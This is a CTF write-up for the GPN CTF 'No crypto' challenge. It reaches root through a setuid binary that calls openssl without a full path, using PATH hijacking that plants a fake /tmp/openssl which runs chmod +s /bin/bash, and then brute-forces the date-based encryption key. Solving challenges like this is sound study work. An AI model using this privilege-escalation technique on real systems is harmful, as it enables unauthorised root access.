# No crypto

|||
|-|-|
|  **CTF**  |  [GPN CTF](https://play.ctf.kitctf.de/) [(CTFtime)](https://ctftime.org/event/2257)  |
|  **Author** |  13x1 |
|  **Category** |  Miscellaneous |
|  **Solves** |  24  |
| **Files** |  [no-crypto.tar.gz](<no-crypto.tar.gz>)  |

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/547f3042-d9e2-4082-8786-aca68cd496e2)

> If you don't like Github, read the writeup [here](https://learn-cyber.net/writeup/No-crypto)

# Solution

When we unzip the file, we can see a few files. Let's check the source of the binary called cli:

```c
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    while (1) {
        char date[256];
        printf("Guess when I was encrypted ([YYYY]-[MM]-[DD]T[HH]:[MM]:[SS]+[HH]:[MM]): ");
        if (fgets(date, sizeof(date), stdin) == NULL) {
            printf("Error reading input.\n");
            return 1;
        }
        date[strcspn(date, "\n")] = '\0';
        pid_t pid = fork();
        if (pid == -1) {
            printf("Error forking process.\n");
            return 1;
        } else if (pid == 0) {
            // Child process
            char* argv[] = {"openssl", "enc", "-d", "-aes-256-cbc", "-k", date, "-pbkdf2", "-base64", "-in", "flag.enc", "-out", "/dev/null", NULL};
            execvp("openssl", argv);
            printf("Error running openssl.\n");
            return 1;
        } else {
            // Parent process
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                printf("The guessed date is correct!\n");
                return 0;
            } else {
                printf("The guessed date is incorrect. Try again!\n");
            }
        }
    }
}
```

So, the binary first asks for a date. It then tries to decrypt the flag.enc file, and if the date is correct, it will let us know; otherwise, it will tell us it is wrong.


If we check the `encrypt.sh` file, we see that it encrypts the flag with OpenSSL based on the date:

```sh
date=$(date -uIseconds)
openssl enc -aes-256-cbc -k "$date" -pbkdf2 -base64 -in flag -out flag.enc
```

Let's check the Dockerfile of the challenge:

```dockerfile
# docker build -t no-crypto . && docker run -p 1337:1337 -t no-crypto
FROM debian:bullseye
RUN apt-get update && apt-get install -y --no-install-recommends build-essential openssl socat \
&& apt-get clean && rm -rf /var/lib/apt/lists/*
RUN mkdir /app
ARG FLAG=GPNCTF{fake_flag}
RUN echo "$FLAG" > /app/flag
COPY cli.c encrypt.sh /app/
WORKDIR /app/
RUN gcc -o cli cli.c \
&& bash encrypt.sh && rm flag \
&& chmod u+s cli \
&& chmod 700 /app/flag.enc
# save space in final image by uninstalling gcc and apt
RUN apt-get remove -y build-essential && apt-get autoremove -y && rm -rf /var/lib/apt/lists/*

RUN useradd -m ctf
USER ctf
EXPOSE 1337
CMD socat TCP-LISTEN:1337,reuseaddr,fork EXEC:/bin/bash,pty,stderr,sigint,sane
```

Here, we can see that it echoes the flag inside `/app/flag`. It then compiles the `cli` binary and runs `encrypt.sh`. After this, it will remove the flag and make the cli binary a `suid` binary. It also changes the permission of `flag.enc` so that only root can access it.

A few points we notice here is:

1. `ARG` is used for the flag, so the flag will not be available during runtime, only build time. If `ENV` was used, it would be accessible inside the container, but it is not useful because there is no process running as root; otherwise, we could get root and access `/proc/$PID/environ`.
2. Because of `chmod u+s`, `cli` is a `suid` binary. This means that no matter which user runs the binary, it always runs as the user that owns the file. In this case `root`.
3. We see that `encrypt.sh` is run, so we should check the date when `flag.enc` is created.

So, what is the bug?

A suid binary is not vulnerable by default. There are a few standard binaries in Linux that always have a suid bit, for example, `passwd`:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/b0cf6b97-bd34-4160-aff4-b3cda1fd378b)

So, it depends on the binary itself if it's vulnerable or not. If we take a closer look at `cli.c`, we can see that it calls `openssl` without using a full path (e.g., `/bin/openssl)`:

```c
char* argv[] = {"openssl", "enc", "-d", "-aes-256-cbc", "-k", date, "-pbkdf2", "-base64", "-in", "flag.enc", "-out", "/dev/null", NULL};
execvp("openssl", argv);
```

This means we can perform a trick called `path hijacking`. 
In Linux, when we call a binary, the system searches for the binary in a list of directories defined in the `$PATH` environment variable. We can modify this environment variable to anything we want.

An explanation of such attack, taken from [here](https://vk9-sec.com/privilege-escalation-linux-path-hijacking/):

1. Path Environment Variable: Linux systems have an environment variable called "PATH" that contains a list of directories in which the system searches for executable files. When a command is executed, the system looks for the corresponding executable file in these directories in the order specified by the PATH variable.
2. Finding a Vulnerable Application: The attacker looks for a vulnerable application that performs file operations or executes commands without properly validating user-supplied input or controlling the search path. For example, an application that uses relative paths or does not sanitize user input.
3. Identifying the Vulnerable Path: The attacker identifies a vulnerable point in the application where the input is used to construct a file path or command without proper validation. The goal is to find a way to manipulate the path used by the application to execute arbitrary files or commands.
4. Crafting the Attack: The attacker provides input that includes special characters or sequences to manipulate the path. These characters or sequences are designed to bypass security checks and allow the attacker to traverse directories or execute arbitrary files.
5. Exploiting the Vulnerability: By carefully constructing the input, the attacker can trick the vulnerable application into executing a malicious file or command. This can lead to various consequences, such as arbitrary code execution, unauthorized access, or privilege escalation.


In this challenge, we can do something like this:

```sh
echo -e '#!/bin/bash -p\nchmod +s /bin/bash' > /tmp/openssl # [1]
chmod +x /tmp/openssl # [2]
export PATH="/tmp:$PATH" # [3]
```
1. Here we create a file in `/tmp` with some code that will make the `bash` binary a suid binary.
2. We make the file executable.
3. We add the directory `/tmp` to our `PATH`. Notice that we add it at the beginning, so the system looks there first.

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/9bd134ac-f662-4323-b583-7a577508238e)
We can see that `/tmp` is now added.
With this setup, when we call `cli`, it will run as root and execute our custom `openssl` binary. 

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/f1dd58f3-f089-4fa3-881d-b03861d251bd)

We can see here that we successfully added a suid bit to `bash`. If we run `bash -p`, we will get the effective UID and GID of root. 
With this, we can read `flag.enc`.

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/eaae58e1-ebc7-4873-b6ec-f62728088e68)

We can now use `stat` on the file to see the exact date of the file:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/3e37ae00-cf6f-42fd-a9be-3fae97e23ba5)

We change the format a little bit and can run this command to decrypt the flag:

```bash
openssl enc -d -aes-256-cbc -k "2024-05-29T01:31:06+00:00" -pbkdf2 -base64 -in flag.enc -out flag.txt
```

During the ctf, I used the date from the output of `ls -la`, so I bruteforced the correct date.

```bash
#!/bin/bash

# Define the start and end times for the brute-force range
start_time="2024-05-29T01:31:00+00:00" # Adjust the date to the correct format and time
end_time="2024-05-29T01:32:00+00:00"   # Brute-forcing within a 1-minute window for example

# Convert start and end times to seconds since epoch
start_epoch=$(date -d "$start_time" +%s)
end_epoch=$(date -d "$end_time" +%s)

# Loop through each second in the range
for ((epoch=$start_epoch; epoch<=$end_epoch; epoch++)); do
    # Convert epoch back to the date format used in the key
    date=$(date -u -d "@$epoch" +"%Y-%m-%dT%H:%M:%S+00:00")
    
    # Attempt to decrypt the file
    output=$(openssl enc -d -aes-256-cbc -k "$date" -pbkdf2 -base64 -in flag.enc -out - 2>/dev/null)
    
    # Check if decryption was successful and contains "GPNCTF{"
    if [[ "$output" == *"GPNCTF{"* ]]; then
        echo "Decryption successful with key: $date"
        echo "$output"
        break
    fi
done
exit 1
```

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/6915f354-5cf5-491c-99ae-4c39ca1f301b)



